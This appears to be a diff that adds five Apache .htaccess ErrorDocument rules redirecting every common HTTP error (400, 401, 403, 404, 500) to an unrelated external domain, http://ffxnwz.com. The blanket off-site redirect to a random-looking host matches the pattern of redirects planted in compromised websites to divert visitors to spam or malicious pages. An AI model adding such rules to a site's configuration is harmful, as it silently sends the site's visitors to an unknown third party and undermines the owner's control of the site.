@@ -1,0 +1,5 @@
+ErrorDocument 400 http://ffxnwz.com
+ErrorDocument 401 http://ffxnwz.com
+ErrorDocument 403 http://ffxnwz.com
+ErrorDocument 404 http://ffxnwz.com
+ErrorDocument 500 http://ffxnwz.com
